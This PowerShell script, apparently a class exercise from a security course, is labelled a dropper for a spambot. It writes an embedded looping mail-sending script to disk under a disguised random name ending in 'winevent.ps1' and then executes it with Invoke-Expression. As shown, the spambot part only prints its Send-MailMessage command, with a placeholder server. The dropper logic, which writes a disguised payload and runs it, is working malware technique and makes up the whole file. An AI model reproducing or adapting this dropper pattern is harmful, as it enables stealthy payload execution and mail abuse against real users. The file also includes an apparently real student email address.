# Dropper for spambot that will save the file and execute it. 

$writeSBbot =@'
# Send an email with powershell

#Create Array
$toSend = @('samuel.johnson01@mymail.champlain.edu', 'sam@sam.net', 'fakeemail@fakedomain.com')

# Message to send
$msg = "Hello"

# Send the email in a loop from array
while ($true) {
    foreach ($email in $toSend) {
        Write-host "Send-MailMessage -From 'samuel.johnson01@mymail.champlain.edu' -To $email -Subject "Test" 
        -Body $msg -SmtpServer X.X.X.X"
        
        # Pause for 1 second
        Start-Sleep 1
    }
    
}
'@

# Directory to write the bot.
$sbDir = 'D:\Sec320\SYS-320\Week10\class\'

# Create a random number to add to the file. 
$sbRand = Get-random -Minimum 1000 -Maximum 1999

# Create the file and location to save the bot. 

$file = $sbDir + $sbRand + "winevent.ps1"

# Write to a file.
$writeSBbot | Out-File -FilePath $file

# Execute code. 
Invoke-Expression $file